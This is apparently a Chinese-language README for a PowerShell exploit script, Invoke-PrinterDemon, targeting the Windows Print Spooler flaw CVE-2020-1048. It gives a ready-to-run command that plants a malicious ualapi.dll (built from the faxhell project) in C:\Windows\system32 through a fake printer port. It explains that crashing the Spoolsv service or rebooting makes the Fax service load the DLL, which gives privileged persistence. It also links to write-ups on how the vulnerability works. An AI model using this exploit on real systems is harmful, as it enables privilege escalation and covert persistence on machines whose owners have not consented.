## PrinterDemon

`Invoke-PrinterDemon` 脚本可以利用 `cve-2020-1048` 漏洞，写数据到系统的任意位置，需要重启 `Spoolsv` 服务

#### 使用方法

```
. .\Invoke-PrinterDemon.ps1

Invoke-RawDataToPrinter -PrinterName PrinterDemon -PrinterPort "C:\Windows\system32\ualapi.dll" -FileName .\ualapi.dll
```

`PrinterName` 可以指定添加的打印机名称，默认是 `PrinterDemon`

`PrinterPort` 可以指定打印机写入的文件路径，默认是 `C:\Windows\system32\ualapi.dll`

`FileName` 指定写入的文件内容，默认是从 [faxhell](https://github.com/ionescu007/faxhell) 项目编译的 `ualapi.dll`

执行完成之后，需要让 `Spoolsv` 服务崩溃重启或直接重启系统，即可写入文件并被 `Fax` 服务加载

`RawDataToPrinter` 是 C 语言实现的写 raw 数据到打印机的代码

#### 漏洞原理：

[PrintDemon: Print Spooler Privilege Escalation, Persistence & Stealth (CVE-2020-1048 & more)](https://windows-internals.com/printdemon-cve-2020-1048/)

[Faxing Your Way to SYSTEM — Part Two](https://windows-internals.com/faxing-your-way-to-system)
